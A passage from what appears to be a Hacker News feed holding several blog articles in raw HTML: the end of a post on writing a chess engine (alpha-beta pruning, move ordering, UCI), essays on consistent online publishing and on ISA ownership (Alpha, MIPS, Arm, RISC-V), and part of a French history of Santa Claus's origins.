<p>My chess engine uses <a href="https://en.wikipedia.org/wiki/Alpha%E2%80%93beta_pruning">alpha-beta pruning</a> as an improvement over the naive minimax algorithm — which does not fare well against the exponential nature of chess. Branches of the search tree can be eliminated when it is clear that another branch shows more promise. This significantly reduces the number of moves required to be generated.</p>
<p><span>
      <a href="https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/42a19/alpha-beta-pruning.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Branches of a minimax search tree being stopped early" title="Branches of a minimax search tree being stopped early" src="https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/42a19/alpha-beta-pruning.png" srcset="https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/a8a0d/alpha-beta-pruning.png 300w,
https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/dface/alpha-beta-pruning.png 600w,
https://healeycodes.com/static/a99200aacf6d6cfc643aaa45317d65aa/42a19/alpha-beta-pruning.png 1024w" sizes="(max-width: 1024px) 100vw, 1024px" loading="lazy">
  </a>
    </span></p>
<p>By reducing the depth of branches that will not bear fruit we can search deeper down the better parts of the tree.</p>
<p>The speed of alpha-beta pruning can be increased by applying <a href="https://www.chessprogramming.org/Move_Ordering">move ordering</a>. This is where the more promising branches of the search tree are searched first — which means less time is spent in the worst branches as they will be cut off early.</p>
<p>Move ordering cannot be 100% accurate but it’s a powerful optimization.</p>
<p>In <a href="https://github.com/healeycodes/andoma">my engine</a>, a cheap (but not perfect) <code>move_value</code> function is used to sort the initial legal move nodes from best to worst. The logic of this function is capture in its docstring:</p>
<div data-language="python"><pre><code><span>'''
How good is a move?
A promotion is great.
A weaker piece taking a stronger piece is good.
A stronger piece taking a weaker piece is bad.
Also consider the position change via piece-square table.
'''</span></code></pre></div>
<h2 id="communication-and-the-uci-protocol"><a href="#communication-and-the-uci-protocol" aria-label="communication and the uci protocol permalink"></a>Communication and the UCI Protocol</h2>
<p>The <a href="https://github.com/healeycodes/andoma/blob/main/uci-interface.md">Universal Chess Interface</a> (UCI) is a open protocol to hook up chess engines to user interfaces. The communication is done through standard input and standard output and messages end with <code>\n</code>. The move format is long algebraic notation — like <code>e2e4</code>, or <code>e1g1</code> for white short castling, and an example of a promotion to queen is <code>a7a8q</code>.</p>
<p>There are many configuration commands in the specification and it initially seemed overwhelming. After debugging, I found that not many were required to get a chess engine to the <em>Hello World</em> stage.</p>
<p>In order to hook my chess engine up to lichess via <a href="https://github.com/ShailChoksi/lichess-bot">lichess-bot</a>, I implemented the following. These commands are send to the engine from lichess-bot:</p>
<ul>
<li><code>uci</code> - the engine reports its name, authors, and <code>uciok</code></li>
<li><code>isready</code> - the engine reports that it’s ready: <code>readyok</code></li>
<li><code>position startpos moves e2e4</code> - the engine sets it’s internal state to match the list of moves</li>
<li><code>go</code> - the engine should now calculate and respond with the next best move, like <code>g8f6</code></li>
</ul>
<h2 id="a-promise"><a href="#a-promise" aria-label="a promise permalink"></a>A Promise</h2>
<p>I have found a great joy interacting with the chess community over the last month. Lichess is a fantastic resource and endlessly fun to play on. The UI is slick and light — and the post-match analysis is revealing and simple to use. It’s <a href="https://github.com/ornicar/lila">open source</a> and relies on donations and sponsorships.</p>
<p>I took breaks from writing this article to play chess against Dad on a real board. We’re missing a white rook and use a pencil sharpener as a replacement piece. He has been telling me stories about playing chess decades ago — before IBM’s <a href="https://en.wikipedia.org/wiki/Deep_Blue_(chess_computer)">Deep Blue</a> emerged and beat Garry Kasparov, the reigning world champion, on its second attempt in 1997.</p>
<p>If you are within my social circle, you will have experienced me evangelizing chess and chess engines over the last month — now that I have published this, I promise to chill out a little bit ♟️</p>
<h2 id="other-resources"><a href="#other-resources" aria-label="other resources permalink"></a>Other Resources</h2>
<p>To build <a href="https://github.com/healeycodes/andoma">healeycodes/andoma</a>, I used the following resources (and recommend all of them).</p>
<ul>
<li><a href="https://www.chessprogramming.org/Main_Page">Chess Programming Wiki</a> — an incredible wealth of knowledge exists here. I spent hours reading through intermediate and advanced concepts just for fun</li>
<li><a href="https://www.youtube.com/watch?v=l-hh51ncgDI">Algorithms Explained – minimax and alpha-beta pruning</a> — Sebastian Lague’s breakdowns …</li></ul></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://healeycodes.com/building-my-own-chess-engine/">https://healeycodes.com/building-my-own-chess-engine/</a></em></p>]]>
            </description>
            <link>https://healeycodes.com/building-my-own-chess-engine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516430</guid>
            <pubDate>Wed, 23 Dec 2020 11:04:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get Consistently Lucky]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516273">thread link</a>) | @Malfunction92
<br/>
December 23, 2020 | https://postmake.io/articles/consistently-lucky | <a href="https://web.archive.org/web/*/https://postmake.io/articles/consistently-lucky">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" data-v-5bed0c61=""><div data-v-5bed0c61=""> <div data-v-5bed0c61=""><div data-v-5bed0c61=""><p>The internet is a wide place.</p>
<p>Last April, amid the COVID-19 induced panic, Fox News interviewed a doctor about the US government’s response to the epidemic.</p>
<p>But his responses to the questions in the interview didn't go as well as the network was hoping.</p>
<p>Shortly after, the interview went viral. More than 10 million views on Twitter for the 90 second clip.</p>
<p>Before the interview, the doctor, <a href="https://twitter.com/RishiDesaiMD">Rishi Desai</a>, didn't have much of a social media presence. So he created a new account on Twitter.</p>

<p><img src="https://images.postmake.io/resources/blog/consistently-lucky/rishi_desai.png" alt="Rishi Desai"></p><p>I still remember watching in disbelief as the account gained over 30 thousand followers in under 24 hours.</p>
<p>No connections, no brand, no tweets, no marketing. Just a viral 90-second video.</p>
<br>

<h3>Dumb Luck</h3>

<p>Of course, "followers" is only a vanity metric. An Instagram model with over 2 million followers <a href="https://www.insider.com/instagrammer-arii-2-million-followers-cannot-sell-36-t-shirts-2019-5">couldn't sell 36 shirts</a> when she launched her brand. A big audience doesn't mean much if they're not engaged. <a href="https://kk.org/thetechnium/1000-true-fans/">1000 true fans</a> and all that.</p>
<p>But it's mind-boggling how much a viral piece of content can change things.</p>
<p>Case in point: <a href="https://twitter.com/alexwestco">Alex</a> recently got his first $50/mo customer. Excited, he shared the news in a tweet.</p>
<br>
<blockquote data-dnt="true" data-theme="light"><p lang="en" dir="ltr">Got my first $50/mo customer! 🎉</p>— Alex West 🚀 (@alexwestco) <a href="https://twitter.com/alexwestco/status/1252656159636545538?ref_src=twsrc%5Etfw">April 21, 2020</a></blockquote>  
<p>The next day, he woke up to hundreds of likes, 1000 new followers, and 10k visitors to his website.</p>
<p>This tweet was an <a href="https://www.alexwest.co/posts/129">inflection point</a> for his business. It put him on the radar, and his business has been on an upward trajectory since.</p>
<p>Why did this particular tweet go viral? There doesn't seem to be any apparent reason. In Alex's words, "luck smiled at me and things went crazy."</p>
<p>This sort of thing happens all the time. A travel blogger's viral Twitter thread that gets her 13k followers. A designer managing to <a href="https://tr.af/6">make six figures</a> in 6 days after a screenshot of his phone goes viral. A <a href="https://www.nateliason.com/blog/roam">blog post</a> that turns into a <a href="https://www.effortlessoutput.com/">side-business</a>.</p>
<p>But here's the thing: as lucky as these might seem, this luck didn't come out of thin air.</p>
<p>Alex has been tweeting consistently every day before his viral tweet. Traf has been making and selling designs online for years. Nat has hundreds of articles on his website.</p>
<p>As a wise man once said, "the harder I work, the luckier I get".</p>
<p>Think of it this way: On average, a piece of content does okay relative to your audience. Some might do bad, some might do a little better. And some can go viral.</p>

<p><img src="https://images.postmake.io/resources/blog/consistently-lucky/not_so_viral_chart.png" alt="Not so viral"></p><p>How do you increase the number of viral content? Simple: you increase the total number of content!</p>

<p><img src="https://images.postmake.io/resources/blog/consistently-lucky/viral_chart.png" alt="Viral"></p><p>Shortly after starting his new project, Harry David saw <a href="https://www.indiehackers.com/product/marketing-examples/4700-new-followers-overnight--LyJM6b62tFbqwiW9nLW">a huge uptick</a> in his audience size when Steve Schoger retweeted one of his Twitter threads. But this wasn't Harry's first post – he has been pushing great content for months before that. It was only a matter of time before one of them went viral.</p>
<p>Take consistent action. If you want a viral blog, don't write one post; write 10. If you want to make a sale, don't reach out to 10 prospects; reach out to 100. </p>
<p>Consistency compounds. Wildly so on the internet. </p>
<br>

<hr>


<p>If you enjoyed this post, please share the Twitter thread. It really helps spread the word! </p>
<blockquote><div lang="en" dir="ltr"><p>The internet is a wide place.</p><p>Last April, amid the COVID-19 induced panic, Fox News interviewed a doctor about the US government’s response to the epidemic.</p><p>Shortly after, the interview went viral. More than 10 million views on Twitter for the 90 second clip. <a href="https://t.co/scSClOpArI">pic.twitter.com/scSClOpArI</a></p></div>— Postmake (@postmakeio) <a href="https://twitter.com/postmakeio/status/1341626733938794496?ref_src=twsrc%5Etfw">December 23, 2020</a></blockquote>  </div></div></div></div><p>
    Just a heads up: By continuing to browse this site, you are agreeing to our use of cookies.
    <span data-v-1994a7c0="">Got it!</span></p></div>]]>
            </description>
            <link>https://postmake.io/articles/consistently-lucky</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516273</guid>
            <pubDate>Wed, 23 Dec 2020 10:34:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Does ISA Ownership Matter? A Tale of Three ISAs]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 17 (<a href="https://news.ycombinator.com/item?id=25516090">thread link</a>) | @todsacerdoti
<br/>
December 23, 2020 | https://codasip.com/2020/12/22/does-isa-ownership-matter-a-tale-of-three-isas/ | <a href="https://web.archive.org/web/*/https://codasip.com/2020/12/22/does-isa-ownership-matter-a-tale-of-three-isas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<div id="cs-content"><div id="x-section-1"><div><div><div><p>An instruction set architecture (ISA) is crucial to the development of processors and their software ecosystems. In the last half century, the majority of ISAs have been owned by single companies, whether product companies for their own chips/systems or processor IP companies who licensed their processors to chip developers. Does <strong>ISA ownership</strong> matter? Let’s consider three proprietary ISAs and their history.</p>
<p>Firstly, the Alpha ISA was developed by Digital Equipment Corporation (DEC) for its workstations and servers and was released in 1992. In the mid-1990s, this was considered a&nbsp;worthy competitor to SPARC and MIPS RISC architectures. However, the ownership of the ISA transferred to Compaq when DEC was acquired in 1998. Compaq in turn sold the rights to the Alpha ISA to Intel in 2001, and in the same year Compaq was acquired by Hewlett Packard. The last Alpha-based products were released in 2004, meaning that the ISA was effectively dead because of a&nbsp;series of acquisitions.</p>
<p>MIPS Technologies was spun out of Silicon Graphics as an independent IP company in 1998. For some years it enjoyed some success, particularly at the higher end of the processor IP market, and was only the second architecture to have Android ported in 2009. However, with a&nbsp;declining share price, MIPS sold 498 patents to AST and agreed to an acquisition by Imagination Technology in 2013. After Canyon Bridge acquired Imagination, MIPS was spun-out again ending up, after a&nbsp;series of transactions, as part of Wave Computing. As an artificial intelligence silicon provider, Wave is a&nbsp;potential competitor to some MIPS licensees.</p>
<p>Wave tried to encourage the adoption of the MIPS ISA in competition to RISC-V through their MIPS Open Initiative in late 2018. However, the licensing terms contained some onerous conditions relating to patents. In late 2019, Wave suddenly shut down the program, giving zero notice. The important lesson is that even if an ISA is open, its future is not secure if it is commercially owned. Seven years of ownership change have seen MIPS’ market share spiral downwards.</p>
<p>The third example is Arm, the biggest processor IP company of them all. Arm has long been seen as not only a&nbsp;big, successful IP company, but one offering “Swiss neutrality” in the semiconductor industry. Arm was quite distinct from both semiconductor companies and EDA companies. As such, it enjoyed a&nbsp;position of trust from its licensees as it did not have a conflict of interest. With its acquisition by SoftBank in 2016, Arm lost control over its destiny, even though SoftBank was not competing with its licensees. With the planned acquisition of Arm by NVIDIA, announced in September 2020, Arm will lose its neutrality completely. As a&nbsp;semiconductor company, there is a&nbsp;conflict of interest between Arm’s owners and its licensees, meaning it can no longer be trusted in the same way.</p>
<p>As can be seen from the ‘Tale of three ISAs’, the <strong>ownership</strong> of an ISA matters a&nbsp;lot, regardless of whether the ISA is commercially licensed or open. Acquisitions can lead to the disappearance of an ISA through merging of product lines or through making licensing difficult. Another motive for taking over a&nbsp;company can even be to kill off a&nbsp;competing product line, which in the case of an ISA could catastrophically impact licensees.</p>
<p>ISA ownership is one of the key issues that the developers of RISC-V have thought about. By transferring the ownership of the ISA to RISC-V International, the original developers of the ISA have assured its longevity. Longevity is assured both by the <strong>independent ownership of the ISA</strong> and the fact that licensees have a&nbsp;<strong>choice of IP vendors</strong> supporting the same open standard. Thirdly, once ratified, the ISA is <strong>frozen</strong> assuring software developers that their code will be able run on suitable cores indefinitely.</p>
<p><strong>Roddy Urquhart</strong></p>
</div></div></div></div></div>
</div>
</div></div>]]>
            </description>
            <link>https://codasip.com/2020/12/22/does-isa-ownership-matter-a-tale-of-three-isas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516090</guid>
            <pubDate>Wed, 23 Dec 2020 09:54:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Généalogie du Père Noël ou ses origines mythologiques]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25516089">thread link</a>) | @Kenoben
<br/>
December 23, 2020 | https://www.dalsaceetdailleurs.com/2020/12/22/genealogie-du-pere-noel/ | <a href="https://web.archive.org/web/*/https://www.dalsaceetdailleurs.com/2020/12/22/genealogie-du-pere-noel/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
   		
<p><em><strong>Depuis la civilisation, divinités, fêtes et phénomènes naturels sont étroitement corrélés. Le Père Noël est l’aboutissement d’une succession de personnages mythologiques occidentaux dont il conserve encore certains attributs.</strong></em></p>



<h4><strong>Trouvez les points communs</strong></h4>



<p>En des temps pré-chrétiens, le dieu principal de la mythologie scandinave, Odin fend les airs sur le dos de <a href="https://fr.wikipedia.org/wiki/Sleipnir">Sleipnir</a> son cheval à huit pattes, distribuant des cadeaux de toit en toit.</p>



<figure><ul><li><figure><img loading="lazy" width="500" height="733" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Georg_von_Rosen_-_Oden_som_vandringsman_1886_Odin_the_Wanderer.jpg" alt="" data-id="5359" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Georg_von_Rosen_-_Oden_som_vandringsman_1886_Odin_the_Wanderer.jpg 500w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Georg_von_Rosen_-_Oden_som_vandringsman_1886_Odin_the_Wanderer-205x300.jpg 205w" sizes="(max-width: 500px) 100vw, 500px"><figcaption>Odin le Vagabond- Georg von Rosen – 1886</figcaption></figure></li></ul></figure>



<p>Son fils, le puissant dieu de la foudre, <a href="https://fr.wikipedia.org/wiki/Thor">Thor</a>, se déplace, vêtu de rouge, sur un char tiré par des boucs.</p>



<div><figure><img loading="lazy" width="708" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/lossy-page1-747px-Thors_Fight_with_the_Giants_Ma%CC%8Arten_Winge_-_Nationalmuseum_-_18253.tiff-708x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/lossy-page1-747px-Thors_Fight_with_the_Giants_Ma%CC%8Arten_Winge_-_Nationalmuseum_-_18253.tiff-708x1024.jpg 708w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/lossy-page1-747px-Thors_Fight_with_the_Giants_Ma%CC%8Arten_Winge_-_Nationalmuseum_-_18253.tiff-208x300.jpg 208w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/lossy-page1-747px-Thors_Fight_with_the_Giants_Ma%CC%8Arten_Winge_-_Nationalmuseum_-_18253.tiff.jpg 747w" sizes="(max-width: 708px) 100vw, 708px"><figcaption>Thor contre les géants – Marten Eskill Winge – 1872</figcaption></figure></div>



<p>Le dieu solaire gaulois Belenos porte une hotte et des bottes.</p>



<p>Son successeur, le dieu romain Apollon conduit le char du soleil autour de la terre pour répandre la lumière.</p>



<br>



<h4><strong>De Saint-Nicolas au Père Noël</strong></h4>



<p>En 270 après Jésus Christ Nicolas nait dans la cité de Patara, en Turquie actuelle. Converti jeune au christianisme, il devient évêque de Myre. Les Romains le décapitent un 6 décembre vers 350 après Jésus Christ. Une fontaine d’huile sainte aurait jailli de son cou. Mort en martyr, il est canonisé.</p>



<p>Une légende rapporte qu’en 1087, des moines montrent le tombeau à des soldats croisés originaires d’Italie. Ils ouvrent le cercueil où les ossements baignent dans l’huile. Ils s’en emparent et l’apportent à Bari. Des bonimenteurs profitent de l’histoire pour s’enrichir en vendant une fausse huile sainte guérisseuse à des malades superstitieux.</p>



<p>Au XIIe siècle, Aubert de Varangéville un chevalier de retour de croisade, passe par Bari où il prend «&nbsp;la phalange d’un doigt bénissant&nbsp;». Il l’emporte chez lui à Port en Lorraine, devenue Saint-Nicolas-de-Port.&nbsp;</p>



<p>Le culte du saint grandit et devient très populaire dans l’est et le nord de la France, en Belgique, aux Pays Bas et en Allemagne.</p>



<p>Une des légendes les plus célèbres parle d’un boucher ayant tué trois petits enfants pour les mettre au saloir. Saint Nicolas passant par-là, les ressuscite. Le boucher devient son compagnon, le redouté Père Fouettard, craint des enfants méchants. Ensemble, ils défilent le 6 décembre, accompagnés parfois dit-on en France depuis le&nbsp;XIIe siècle, par un vieillard appelé plus tard «&nbsp;Noël&nbsp;».&nbsp;</p>



<figure><img loading="lazy" width="999" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-999x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-999x1024.jpg 999w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-293x300.jpg 293w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-768x787.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-1499x1536.jpg 1499w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/La_Bastide_Clairence-E%CC%81glise_Notre_Dame-Saint_Nicolas-20180429-1998x2048.jpg 1998w" sizes="(max-width: 999px) 100vw, 999px"><figcaption>La Bastide Clairence église Notre-Dame-Saint-Nicolas- Landes, France – Crédit photo Daniel Villafruela</figcaption></figure>



<p>Protecteur des écoliers, Saint Nicolas récompense les enfants sages dans la nuit du 5 au 6 décembre. Ils posent leurs souliers devant la cheminée ou devant la porte pour que Saint Nicolas y dépose un cadeau. En retour, les enfants préparent du sucre, du lait et une carotte pour la mule du saint.</p>



<div><figure><img loading="lazy" width="654" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5-654x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5-654x1024.jpg 654w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5-192x300.jpg 192w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5-768x1203.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Christmas-Children-5.jpg 956w" sizes="(max-width: 654px) 100vw, 654px"></figure></div>



<br>



<h4><strong>Convergences des genres</strong></h4>



<p>Avec la <a href="https://fr.wikipedia.org/wiki/R%C3%A9forme_protestante">Réforme</a>, les protestants relèguent les saints pour se concentrer sur les figures principales de la chrétienté. Si l’enfant Jésus, le «&nbsp;<em><a href="https://fr.wikipedia.org/wiki/Christkindel">Christkindel</a>&nbsp;»</em> parfois représenté par une jeune fille, supplante Saint Nicolas en Allemagne, <em>Sinter Klaas</em> se maintient aux Pays-Bas. Mais le «&nbsp;<em>Christkindel</em>&nbsp;» est trop petit pour conduire le traîneau et trop chétif pour soulever une hotte ou un sac de cadeaux…</p>



<div><figure><img loading="lazy" width="819" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-819x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-819x1024.jpg 819w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-240x300.jpg 240w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-768x960.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-1229x1536.jpg 1229w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-1639x2048.jpg 1639w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/DSC09814-scaled.jpg 2048w" sizes="(max-width: 819px) 100vw, 819px"><figcaption>Christkind – Musée de Bouxwiller Bas-Rhin</figcaption></figure></div>



<p>Au XVIIIe siècle en Allemagne ressurgissent le petit peuple des&nbsp;fées, des&nbsp;elfes&nbsp;et… le «&nbsp;<em><a href="https://de.wikipedia.org/wiki/Weihnachtsmann">Weihnachtsmann</a>&nbsp;»</em>, l’homme de Noël, qui se déplace en traîneau offrant des sapins décorés de cadeaux.</p>



<div><figure><img loading="lazy" width="655" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-655x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-655x1024.jpg 655w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-192x300.jpg 192w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-768x1200.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-983x1536.jpg 983w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-1311x2048.jpg 1311w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-on-donkey-scaled.jpg 1639w" sizes="(max-width: 655px) 100vw, 655px"></figure></div>



<p>Dans les contrées nordiques, c’est le <a href="https://fr.wikipedia.org/wiki/Nisse_(folklore)">nisse</a> ou le tomte, des lutins, qui interviennent à la fête du milieu de l’hiver, la&nbsp;«&nbsp;<em>Midtvintersblo</em>, gratifiant les humains de cadeaux.</p>



<figure><img loading="lazy" width="838" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912-838x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912-838x1024.jpg 838w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912-246x300.jpg 246w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912-768x938.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/884px-Julbocken_1912.jpg 884w" sizes="(max-width: 838px) 100vw, 838px"><figcaption>Julbocken – John Bauer – 1912</figcaption></figure>



<p>Fin du&nbsp;XVIIe siècle, des gravures anglaises figurent le «&nbsp;<em>Father Christmas</em>&nbsp;», «&nbsp;<em>Sir Christmas</em>&nbsp;» ou «&nbsp;<em>Lord Christmas</em>&nbsp;». À l’instar du Dieu Odin, une longue cape à capuche verte couvre ses épaules et sa tête est ceinte d’une couronne de fleurs, de lierre ou de gui. Passant de maison en maison, il s’invite à table. Lui faire bon accueil garantit un hiver clément.<strong></strong></p>



<p>Vers 1870-1890 en France, le Père Noël est un vieillard chenu dont le manteau est&nbsp;tour à tour vert, bleu, jaune, violet, orange, voire brun. Il passe au rouge juste avant 1914. </p>



<p>Il coexiste avec le maigre et austère «&nbsp;Bonhomme Noël&nbsp;» ou «&nbsp;Père Janvier&nbsp;» couvert de vêtements d’hiver blancs et rouges. Antipathique, il punit les enfants désobéissants à coups de baguettes glissées dans sa ceinture. S’il partage avec Saint Nicolas d’arborer une barbe blanche et de porter parfois une bure, la comparaison s’arrête là.</p>



<p>Simultanément, l’«&nbsp;Enfant Jésus&nbsp;» est bien présent.</p>



<div><figure><img loading="lazy" width="1024" height="654" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-1024x654.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-1024x654.jpg 1024w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-300x191.jpg 300w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-768x490.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-1536x980.jpg 1536w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Angel-through-window-2048x1307.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<br>



<h4><strong>Un personnage de synthèse</strong></h4>



<p>Au XVIIe siècle, Saint Nicolas voyage jusqu’en Amérique avec les colons hollandais. Celui qu’ils appellent <em>Sinterclaes</em> y deviendra <em>Santa Claus</em> puis le <em>Père Noël</em>.</p>



<p>Deux pratiques coexistent, les migrants francophones catholiques s’attachent à l’enfant Jésus, tandis que les anglophones maintiennent la tradition d’un&nbsp;Santa Claus distribuant des cadeaux.</p>



<p>En 1809, pour <a href="https://fr.wikipedia.org/wiki/Washington_Irving">Washington Irving</a>, Saint Nicolas est un vieux lutin&nbsp;qui&nbsp;<em>«&nbsp;s’envole au-dessus des arbres dans un chariot volant, transportant ses cadeaux aux enfants&nbsp;».</em></p>



<p>En 1821, dans le livre<em> «&nbsp;Un Cadeau pour le nouvel an aux petits de cinq à douze ans</em>&nbsp;» édité à New York, un poème anonyme parle du «&nbsp;Old Santa Claus&nbsp;».</p>



<p>En 1822, un autre poème édité anonymement et attribué au pasteur américain <a href="https://fr.wikipedia.org/wiki/Clement_Clarke_Moore">Clement Clarke Moore</a>, «&nbsp;<a href="https://fr.wikipedia.org/wiki/A_Visit_from_St._Nicholas">Une visite de saint Nicolas</a>&nbsp;»&nbsp;raconte le&nbsp;<em>«&nbsp;petit vieux gaillard et ventripotent de St Nick&nbsp;»</em> se déplaçant dans un traîneau tiré par huit rennes sur les toits au son des clochettes. Vêtu d’un manteau de fourrure il distribue des cadeaux en passant par la cheminée.</p>



<p>Depuis 1823, on connaît les noms des huit rennes du Père Noël&nbsp;: Tornade, Danseur, Furie, Fringant, Comète, Cupidon, Éclair et Tonnerre. Ils deviennent, dès lors, les sujets de nombreux livres puis plus tard de films d’animations pour les enfants.</p>



<p>En 1939 le poète <a href="https://fr.wikipedia.org/wiki/Robert_L._May">Robert L. May</a> invente l’histoire de <em><a href="https://fr.wikipedia.org/wiki/Rudolphe_le_renne_au_nez_rouge">Rudolphe le renne au nez rouge</a></em>.</p>



<div><figure><img loading="lazy" width="673" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-673x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-673x1024.jpg 673w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-197x300.jpg 197w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-768x1169.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus-1009x1536.jpg 1009w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/adventuresofSantaClaus.jpg 1183w" sizes="(max-width: 673px) 100vw, 673px"></figure></div>





<h4><strong>Du personnage mythologique à la figure commerciale</strong></h4>



<p>En 1838, <a href="https://fr.wikipedia.org/wiki/Robert_Walter_Weir">Robert Walter Weir</a> dessine Saint Nicolas pour la première fois en costume rouge et blanc sous les traits d’un lutin grincheux dont la petite taille lui permet de glisser dans une cheminée.</p>



<p>En 1863, <a href="https://en.wikipedia.org/wiki/Thomas_Nast">Thomas Nast</a>, Américain né en Allemagne, publie dans le journal new-yorkais <a href="https://en.wikipedia.org/wiki/Harper%27s_Weekly">Harper’s Weekly</a> le dessin en noir et blanc d’un personnage bedonnant, vêtu de fourrure, d’une ceinture noire et d’un bonnet. Il viendrait du pôle Nord, région froide, mystérieuse et alors encore inexplorée. Plus tard ses dessins seront mis en couleur selon les modes du moment.</p>



<figure><img loading="lazy" width="719" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-719x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-719x1024.jpg 719w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-211x300.jpg 211w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-768x1094.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-1078x1536.jpg 1078w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav-1438x2048.jpg 1438w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/ThomasNastSantav.jpg 1685w" sizes="(max-width: 719px) 100vw, 719px"><figcaption>Thomas Nast – Harpers Weekly – 1863</figcaption></figure>



